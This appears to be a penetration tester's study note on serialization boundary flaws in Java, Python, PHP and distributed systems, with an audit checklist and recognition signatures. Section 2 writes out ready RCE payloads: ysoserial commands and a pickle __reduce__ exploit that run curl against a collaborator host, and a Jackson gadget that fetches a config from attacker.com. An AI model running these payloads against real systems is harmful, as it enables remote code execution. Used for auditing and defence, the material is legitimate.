# Serialization Boundary Failures

## Mechanism Overview (AOSSA Ch 7/12)
Serialization converts complex, in-memory objects into a linear stream of bytes (and vice-versa). Vulnerabilities occur when an application **trusts the reconstructed state** of an object without re-validating it against security policies.

## 1. Structure & Member Inconsistency
Attackers manipulate the byte stream to create objects that are logically impossible or "out of sync."

### **The "Parallel Field" Desync**
*   **Logic:** An object has two related fields (e.g., `User_ID` and `Is_Admin`).
*   **Failure:** The server assumes these fields are always in sync based on the database record. However, an attacker modifies the serialized cookie to set `User_ID=123` but `Is_Admin=true`.
*   **Offensive Pivot:** Identify all members of a serialized object. Modify them independently to find "Logic Bypasses" where the application trusts one field but uses the other for sensitive actions.

---

## 2. Type Confusion & Object Injection
Forcing the deserializer to instantiate an unintended class.

### **Lifecycle Hijacking**
*   **Mechanism:** Deserialization often bypasses standard constructors but triggers other "magic" methods (e.g., `readObject` in Java, `__wakeup` in PHP, `__reduce__` in Python pickle).
*   **Failure:** If the application allows instantiating *any* class in the classpath, an attacker can pick a class that performs a dangerous action (File Delete, Exec) in its "Wakeup" or "Destructor" method.
*   **Audit Goal:** Identify the library being used for serialization (Java Serialization, Python Pickle, .NET BinaryFormatter). Use "Gadget Chains" to move from object instantiation to code execution.

### **Java Deserialization & Polymorphic Typing (RCE Primitives)**
*   **Signatures:** Base64 prefix `rO0AB` or hex magic bytes `AC ED 00 05` (Java Serialization stream), or JSON fields with typing info (`@class`, `@type`, `["java.util.HashMap", ...]`).
*   **Vulnerable Gateways:**
    - Java `ObjectInputStream.readObject()` invoked on HTTP request body, cookies, or JMS message queues.
    - Jackson Polymorphic Deserialization (`ObjectMapper.enableDefaultTyping()`).
    - Fastjson `AutoType` deserialization bypasses.
*   **Exploitation Matrix (ysoserial):**
    ```bash
    # Common Collections 1-7 (Tomcat, WebLogic, JBoss)
    java -jar ysoserial.jar CommonsCollections6 "curl https://burpcollaborator.net" | base64 -w 0

    # Spring Framework Gadget
    java -jar ysoserial.jar Spring1 "curl https://burpcollaborator.net" | base64 -w 0

    # Jackson Polymorphic Typing Payload
    {"@class":"org.springframework.context.support.ClassPathXmlApplicationContext", "configLocation":"http://attacker.com/spel.xml"}
    ```

### **Python Insecure Deserialization (`pickle` & `yaml.load`)**
*   **Mechanism:** `pickle.loads()` allows arbitrary callable execution via `__reduce__`:
    ```python
    import pickle, os, base64
    class Exploit(object):
        def __reduce__(self):
            return (os.system, ("curl https://burpcollaborator.net",))
    print(base64.b64encode(pickle.dumps(Exploit())).decode())
    ```
*   **Safe Alternatives:** Use `json.loads()` or `yaml.safe_load()`.

---

## 3. Lifecycle & Boundary Assumptions (AOSSA Ch 7/12)
Developers often treat serialized data as "Internal" because it is opaque to the user.

### **The "Constructor Bypass" Problem**
*   **Mechanism:** Deserialization reconstructs the object state directly into memory, skipping the logic inside the constructor (where validation usually lives).
*   **Failure:** Deserialization creates objects in a **"Zombie State"**—the memory is filled with untrusted data, but the constructor was never called. If the application then uses this object without manual re-validation, it operates on a corrupted state.
*   **Audit Goal:** Identify sensitive fields that are "Validated in Constructor" but "Trusted in Methods".

### **Resource Lifecycle Abuse**
*   **Mechanism:** Objects managing external resources (File handles, Sockets, Memory pools).
*   **Failure:** A serialized object claims to "own" a resource ID it did not create. When the object is garbage-collected or "Destructed", it frees/closes the resource.
*   **Offensive Pivot:** Use serialization to "Adopt" resources belonging to other sessions/processes, then trigger destruction to cause a **DoS**.

---

## 4. Metadata Integrity & Ordering (DDIA Ch 8)
Distributed systems often rely on metadata to resolve conflicts or order events.

### **LWW State Poisoning (Last-Write-Wins)**
*   **Mechanism:** Many databases (and custom caches) resolve conflicts by picking the record with the highest timestamp.
*   **Failure:** If the system trusts client-provided timestamps in a serialized object, an attacker can provide a "Future" timestamp. This ensures their malicious state (e.g., `Permissions: ALL`) always "wins" and overwrites any legitimate security updates.
*   **Offensive Pivot:** Identify timestamp or version fields in serialized tokens. Inject extremely high values (e.g., Year 9999).

### **Distributed Replay & Version Desync**
*   **Mechanism:** A single-use token or state change is propagated across multiple replicas.
*   **Failure:** Before Node A can propagate the "Invalidated" state to Node B, an attacker replays the serialized object against Node B.
*   **Audit Goal:** Capture a serialized transaction and fire it simultaneously against different regional endpoints (e.g., `us-east-1` and `eu-west-1`).

---

## 5. Serialization Audit Checklist
When encountering serialized tokens, cookies, or RPC calls, verify these AOSSA primitives:

1.  **Origin of Trust:** Is the serialized stream integrity-protected (HMAC/Signature)? (If not, every field is a potential attack vector).
2.  **Type Constraint:** Does the deserializer restrict instantiation to a strict allow-list of classes?
3.  **Member Independence:** Can you change one field without breaking the parser's logic for the others?
4.  **Automatic Execution:** What methods run automatically when this object is destroyed or garbage-collected? (Target "Cleanup" logic for secondary impacts).

## Recognition Patterns
*   **Java:** Look for `AC ED 00 05` (Base64 `rO0AB...`). Often passed in proxy headers like `X-Mule-Session` or cookies.
*   **PHP:** Look for `O:8:"ClassName":...`.
*   **Python:** Look for `.pkl` files or `pickle.loads()`.
*   **Protobuf:** Target "Unknown Fields" that the parser might preserve and forward to other systems.
